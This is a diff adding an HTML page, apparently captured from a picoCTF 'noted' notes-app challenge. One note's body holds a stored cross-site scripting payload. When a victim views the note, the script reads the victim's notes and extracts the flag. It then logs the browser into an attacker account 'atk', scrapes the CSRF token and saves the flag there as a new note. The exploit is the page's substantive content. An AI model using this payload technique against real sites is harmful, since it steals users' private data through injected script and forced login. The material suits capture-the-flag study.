@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>noted | my notes</title>
+	<style>
+	* {
+		font-family: sans-serif;
+	}
+
+	body {
+		max-width: 1200px;
+		padding: 20px;
+		margin: auto;
+	}
+
+	h1 {
+		line-height: 1em;
+	}
+
+	input, button, textarea {
+		padding: 5px;
+		font-size: 17px;
+		border: 1px solid gray;
+	}
+
+	form {
+		line-height: 1em;
+	}
+
+	hr {
+		border: 0;
+		border-top: 1px solid gray;
+	}
+</style>
+</head>
+<body>
+<h1>My Notes</h1>
+<hr>
+
+<div>
+	<h2>X</h2>
+	<p><script>fetch('/notes').then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m){fetch('/login',{method:'POST',body:new URLSearchParams({username:'atk',password:'atk'})}).then(()=>fetch('/new').then(r=>r.text()).then(t=>{fetch('/new',{method:'POST',body:new URLSearchParams({_csrf:t.match(/name="_csrf" value="([^"]+)"/)[1],title:'FLAG',content:m[0]})})}))}})</script></p>
+	<form action="/delete" method="POST">
+		<input type="hidden" name="_csrf" value="ZqD5lnnQ-_MvdOo-6Q5t4ko9gEFrg7Dwvv-w">
+		<input type="hidden" name="id" value="1">
+		<input type="submit" value="Delete">
+	</form>
+</div>
+<hr>
+
+<br>
+<a href='/new'>New Note</a> | <a href='/report'>Report</a>
+</body>
+</html>
